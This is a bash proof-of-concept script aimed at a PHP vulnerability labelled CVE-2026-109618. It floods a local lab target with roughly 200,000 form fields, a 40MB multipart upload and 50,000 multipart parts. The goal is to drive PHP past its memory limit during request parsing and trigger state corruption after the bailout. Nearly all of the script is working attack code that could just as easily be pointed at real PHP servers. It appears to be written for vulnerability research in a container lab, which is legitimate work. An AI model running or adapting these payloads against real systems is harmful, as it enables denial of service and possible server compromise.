#!/usr/bin/env bash
# =============================================================
# CVE-2026-109618: OOM corruption test harness
# =============================================================
#
# Goal: push PHP past memory_limit during the C-level request
# parsing phase (before userland code runs), triggering the
# longjmp bailout that leaves internal structures half-built.
#
# The memory_limit is set to 32M in the container. post_max_size
# is 256M, so PHP will accept payloads larger than memory_limit
# can hold during parsing.
#
# Three approaches, from simplest to most targeted:

TARGET="http://localhost:8080/oom_target.php"

echo "=== Test 1: Large number of form fields ==="
echo "The advisory says 'normal form posts can trigger CVE-2026-109618"
echo "on mod_php.' Each field name and value consumes memory during"
echo "request parsing in the C layer."
echo ""

# Generate a POST body with thousands of form fields.
# PHP allocates a zval + hash entry for each field during RINIT.
# At ~200 bytes per entry, 200K fields pushes toward 40MB.
BODY=""
for i in $(seq 1 200000); do
    BODY="${BODY}&field_${i}=AAAAAAAAAAAAAAAA"
done
# Strip leading &
BODY="${BODY:1}"

echo "Sending ~200K form fields..."
curl -s -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "$BODY" \
    "$TARGET" 2>&1 || true
echo ""

echo "=== Test 2: Large multipart upload ==="
echo "Multipart parsing allocates memory for each part's headers,"
echo "boundary scanning buffer, and the assembled value."
echo ""

# Create a temporary large file
dd if=/dev/urandom of=/tmp/bigfile.bin bs=1M count=40 2>/dev/null
echo "Sending 40MB multipart upload..."
curl -s -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    -X POST \
    -F "file=@/tmp/bigfile.bin" \
    "$TARGET" 2>&1 || true
rm -f /tmp/bigfile.bin
echo ""

echo "=== Test 3: Many multipart parts (no files) ==="
echo "Each multipart part requires separate parsing state in the C"
echo "layer. Many small parts may hit the OOM at a different point"
echo "in the initialization sequence than one large part."
echo ""

# Build a multipart body with many small parts
BOUNDARY="----php2shelltest"
MULTIPART_BODY=""
for i in $(seq 1 50000); do
    MULTIPART_BODY="${MULTIPART_BODY}--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"p${i}\"\r\n\r\nAAAAAAAA\r\n"
done
MULTIPART_BODY="${MULTIPART_BODY}--${BOUNDARY}--\r\n"

echo "Sending ~50K multipart parts..."
echo -e "$MULTIPART_BODY" | curl -s -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    -X POST \
    -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
    --data-binary @- \
    "$TARGET" 2>&1 || true
echo ""

echo "=== Check container logs for Fatal error / memory exhaustion ==="
echo "Run: docker logs php2shell-lab"
echo ""
echo "What to look for:"
echo "  - 'Allowed memory size of N bytes exhausted'"
echo "  - Segfaults (signal 11) after memory exhaustion"
echo "  - Corrupted error messages (sign of state corruption)"
echo ""
echo "The OOM itself is not the vuln. The vuln is what happens AFTER"
echo "the OOM: the longjmp skips over initialization, and RSHUTDOWN"
echo "cleans up data structures that were never properly set up."
